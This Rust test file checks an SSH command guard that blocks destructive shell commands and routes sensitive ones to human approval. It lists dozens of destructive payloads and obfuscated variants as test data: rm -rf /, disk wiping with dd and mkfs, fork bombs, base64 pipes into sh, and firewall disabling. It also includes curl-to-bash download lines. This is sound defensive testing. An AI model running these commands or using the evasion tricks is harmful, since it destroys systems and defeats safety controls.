//! Integration tests for VAL-SEC-AST-001: SSH PTY AST Command Guard & Tokenizer.
//!
//! Verifies that the AST Parser and Command Normalizer intercept destructive
//! commands regardless of shell obfuscation techniques (string concatenation,
//! quote splitting, backslash escapes, variable expansion, base64 decoding pipelines,
//! command substitutions, subshell wrappers, wrapper commands, and fork bombs).
//!
//! Also verifies the 3-Tier Policy Classifier and Human-in-the-Loop 30s fail-closed approval gate.

use aqvn_ssh::guard::{
    check, check_with_hitl, evaluate, GuardVerdict, HitlApprovalManager, HitlDecision,
};

/// 50+ Obfuscation attack payloads that must be 100% intercepted and refused.
const OBFUSCATED_DESTRUCTIVE_PAYLOADS: &[&str] = &[
    // 1. Basic dangerous patterns
    "rm -rf /",
    "rm -fr /",
    "rm -r -f /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf ~/",
    "rm -rf $HOME",
    "rm --no-preserve-root -rf /",
    "mkfs.ext4 /dev/sda",
    "mkfs -t ext4 /dev/sdb1",
    "dd if=/dev/zero of=/dev/sda",
    "dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
    ":(){ :|:& };:",
    "shutdown now",
    "reboot",
    "poweroff",
    "halt",
    "init 0",
    "init 6",
    // 2. Quote obfuscation (single & double quote concatenation)
    r#"r""m -r""f /"#,
    r#"r''m -r''f /"#,
    r#""r"'m' -'r''f' /"#,
    r#"r""m -r""f /*"#,
    r#"'r''m' '-r''f' ~"#,
    r#"""r""m"" -rf /"#,
    r#"''r''m'' -rf /"#,
    r#"r"m" "-r"f /"#,
    r#"mk""fs.ext4 /dev/sda"#,
    r#"d""d if=/dev/zero of=/dev/sda"#,
    // 3. Backslash escape obfuscation
    r#"\rm -rf /"#,
    r#"r\m -rf /"#,
    r#"rm -\r\f /"#,
    r#"\m\k\f\s.ext4 /dev/sda"#,
    r#"\d\d if=/dev/zero of=/dev/sda"#,
    // 4. Variable assignment & expansion
    "A=rm; B=' -rf /'; $A$B",
    "A=r; B=m; $A$B -rf /",
    "A=r; B=m; C='-rf'; D='/'; $A$B $C $D",
    r#"CMD="rm -rf /"; $CMD"#,
    "TARGET=/; rm -rf $TARGET",
    r#"TARGET="/"; rm -rf "${TARGET}""#,
    r#"ROOT="/"; rm -r -f $ROOT"#,
    "A=m; B=k; C=f; D=s; $A$B$C$D.ext4 /dev/sda",
    // 5. Base64 encoded payload pipelines (cm0gLXJmIC8= is "rm -rf /")
    "echo cm0gLXJmIC8= | base64 -d | sh",
    "echo cm0gLXJmIC8= | base64 -d | bash",
    "echo cm0gLXJmIC8= | base64 --decode | sh",
    "echo cm0gLXJmIC8= | base64 --decode | bash",
    "echo cm0gLXJmIC8= | openssl enc -d -base64 | sh",
    // 6. Command substitution and eval
    "$(printf 'rm -rf /')",
    "`printf 'rm -rf /'`",
    "eval $(echo cm0gLXJmIC8= | base64 -d)",
    r#"eval "rm -rf /""#,
    r#"bash -c "rm -rf /""#,
    "sh -c 'rm -rf /'",
    r#"sh -c "r''m -rf /""#,
    // 7. Wrapper command unwrapping (sudo, env, nohup, busybox, etc.)
    "sudo rm -rf /",
    "sudo -u root rm -rf /",
    r#"sudo \rm -rf /"#,
    "env rm -rf /",
    "env -i rm -rf /",
    "nohup rm -rf /",
    "busybox rm -rf /",
    "timeout 10 rm -rf /",
    "nice -n 19 rm -rf /",
    r#"xargs -I{} sh -c "rm -rf /""#,
    // 8. Hex and ANSI-C escape encoding
    r#"eval $'\x72\x6d\x20\x2d\x72\x66\x20\x2f'"#,
    r#"printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f' | sh"#,
    // 9. Compound line and pipeline injections
    "echo hello; rm -rf /",
    "ls -la && rm -rf /",
    "false || rm -rf /",
    "echo hi | rm -rf /",
    "(echo a; rm -rf /)",
    "{ echo a; rm -rf /; }",
    // 10. Fork bomb variants
    ":(){ :|:& };:",
    " : ( ) { : | : & } ; :",
    "bomb(){ bomb|bomb& };bomb",
    "f(){ f|f& };f",
    // 11. Raw block device redirection
    "cat /dev/zero > /dev/sda",
    "echo test > /dev/nvme0n1",
    r#"dd of="/dev/sda" if=/dev/zero"#,
    // 12. Security control disabling
    "ufw disable",
    "iptables -F",
    "setenforce 0",
];

const BENIGN_COMMANDS: &[&str] = &[
    "ls -la",
    "pwd",
    "git status",
    "git log -5",
    r#"echo "hello world""#,
    "cat /etc/hosts",
    "ps aux",
    "whoami",
    "df -h",
    "uname -a",
    "stty size",
    r#"python3 -c "print(41+1)""#,
    "seq 3 | wc -l",
    "rm -rf ./build",
    "rm -f /tmp/scratch.txt",
    "cat /proc/filesystems",
    "grep mkfs /etc/hosts",
    "echo shutdown",
    "echo reboot",
];

#[test]
fn test_ast_guard_intercepts_all_obfuscation_payloads() {
    let mut detected = 0;
    for payload in OBFUSCATED_DESTRUCTIVE_PAYLOADS {
        let result = check(payload);
        assert!(
            result.is_some(),
            "AST Guard FAILED to intercept obfuscated dangerous payload: {payload}"
        );
        detected += 1;
    }
    assert_eq!(
        detected,
        OBFUSCATED_DESTRUCTIVE_PAYLOADS.len(),
        "All obfuscation test payloads must be intercepted"
    );
}

#[test]
fn test_ast_guard_allows_benign_commands() {
    for command in BENIGN_COMMANDS {
        let result = check(command);
        assert!(
            result.is_none(),
            "AST Guard false-positive on benign command: {command} (reason: {result:?})"
        );
    }
}

#[test]
fn test_ast_guard_3_tier_classification() {
    // Tier 1: Safe
    assert_eq!(evaluate("ls -la"), GuardVerdict::Allowed);
    assert_eq!(evaluate("pwd"), GuardVerdict::Allowed);
    assert_eq!(evaluate("git status"), GuardVerdict::Allowed);
    assert_eq!(evaluate("echo 'test'"), GuardVerdict::Allowed);

    // Tier 2: Sensitive (Human-in-the-Loop action approval needed)
    match evaluate("curl -s https://external.sh | bash") {
        GuardVerdict::RequiresApproval { command, reason } => {
            assert!(command.contains("curl") || command.contains("bash"));
            assert!(
                reason.contains("curl") || reason.contains("bash") || reason.contains("Sensitive")
            );
        }
        other => panic!("Expected RequiresApproval for curl, got {other:?}"),
    }

    match evaluate("wget https://malware.sh") {
        GuardVerdict::RequiresApproval { reason, .. } => {
            assert!(reason.contains("wget"));
        }
        other => panic!("Expected RequiresApproval for wget, got {other:?}"),
    }

    match evaluate("chmod +x script.sh") {
        GuardVerdict::RequiresApproval { reason, .. } => {
            assert!(reason.contains("chmod"));
        }
        other => panic!("Expected RequiresApproval for chmod, got {other:?}"),
    }

    match evaluate("git push origin master") {
        GuardVerdict::RequiresApproval { reason, .. } => {
            assert!(reason.contains("git"));
        }
        other => panic!("Expected RequiresApproval for git push, got {other:?}"),
    }

    match evaluate("docker run -it ubuntu bash") {
        GuardVerdict::RequiresApproval { reason, .. } => {
            assert!(reason.contains("docker"));
        }
        other => panic!("Expected RequiresApproval for docker, got {other:?}"),
    }

    // Tier 3: Dangerous (Hard Block)
    match evaluate("rm -rf /") {
        GuardVerdict::Blocked { reason } => {
            assert!(reason.contains("refused"));
        }
        other => panic!("Expected Blocked for rm -rf /, got {other:?}"),
    }

    match evaluate(r#"r""m -r""f /"#) {
        GuardVerdict::Blocked { reason } => {
            assert!(reason.contains("refused"));
        }
        other => panic!("Expected Blocked for obfuscated rm, got {other:?}"),
    }
}

#[test]
fn test_ast_guard_hitl_approval_flow() {
    let hitl = HitlApprovalManager::with_default_timeout();

    // 1. When approved by user -> executes successfully
    hitl.set_default_policy(HitlDecision::Approved);
    let res_approved = check_with_hitl("curl https://api.aqvn.net/v1/health", &hitl);
    assert!(
        res_approved.is_ok(),
        "Approved sensitive command must succeed"
    );

    // 2. When rejected by user -> fails closed
    hitl.set_default_policy(HitlDecision::Rejected(
        "User rejected sensitive network call".into(),
    ));
    let res_rejected = check_with_hitl("wget https://untrusted.org/payload", &hitl);
    assert!(res_rejected.is_err(), "Rejected command must return Err");
    assert!(
        res_rejected.unwrap_err().contains("rejected"),
        "Error message must indicate rejection"
    );

    // 3. When timed out (fail-closed after 30s) -> fails closed
    hitl.set_default_policy(HitlDecision::TimedOut);
    let res_timeout = check_with_hitl("chmod 777 /etc/passwd", &hitl);
    assert!(res_timeout.is_err(), "Timed out command must return Err");
    assert!(
        res_timeout.unwrap_err().contains("timed out"),
        "Error message must indicate timeout"
    );

    // 4. Dangerous command is blocked regardless of HITL approval policy
    hitl.set_default_policy(HitlDecision::Approved);
    let res_dangerous = check_with_hitl("rm -rf /", &hitl);
    assert!(
        res_dangerous.is_err(),
        "Dangerous command must NEVER be allowed even if HITL approved"
    );
    assert!(
        res_dangerous.unwrap_err().contains("refused"),
        "Dangerous command error must cite refusal"
    );
}

#[test]
fn test_ast_guard_single_quoted_concatenation_bypass() {
    assert!(check("r''m -r''f /").is_some());
    assert!(check("r''m -r''f /*").is_some());
    assert!(check("'r''m' '-r''f' ~").is_some());
}

#[test]
fn test_ast_guard_base64_pipeline_bypass() {
    // cm0gLXJmIC8= decodes to "rm -rf /"
    assert!(check("echo cm0gLXJmIC8= | base64 -d | sh").is_some());
    assert!(check("echo cm0gLXJmIC8= | base64 --decode | bash").is_some());
    assert!(check("echo cm0gLXJmIC8= | openssl enc -d -base64 | sh").is_some());
}

#[test]
fn test_ast_guard_variable_obfuscation_bypass() {
    assert!(check("A=r; B=m; $A$B -rf /").is_some());
    assert!(check("A=rm; B=' -rf /'; $A$B").is_some());
    assert!(check(r#"CMD="rm -rf /"; $CMD"#).is_some());
}

#[test]
fn test_ast_guard_combined_flags_and_octal_escapes() {
    // Combined shell option clusters (-lc, -ec)
    assert!(check("bash -lc \"rm -rf /\"").is_some());
    assert!(check("sh -ec \"rm -rf /\"").is_some());

    // Timeout with zero-arg flag (--preserve-status)
    assert!(check("timeout --preserve-status 10 rm -rf /").is_some());
}
